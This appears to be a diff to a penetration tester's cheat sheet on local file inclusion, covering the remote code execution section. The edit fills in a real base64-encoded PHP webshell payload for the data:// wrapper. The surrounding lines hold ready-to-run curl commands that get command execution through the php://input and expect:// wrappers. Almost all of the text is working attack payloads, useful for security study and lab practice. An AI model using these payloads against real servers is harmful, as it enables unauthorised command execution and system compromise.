@@ -13,7 +13,7 @@ LFI Bypasse
 
 Remote Code Execution
  PHP Wrappers
-1)	/index.php?language=data://text/plain;base64,<in base64 encoded the php command for webshell>&cmd=id                             - RCE with data wrapper
+1)	/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id                           - RCE with data wrapper
 2)	 curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"       - RCE with input wrapper
 3)	 curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"                                                              - RCE with expect wrapper
 
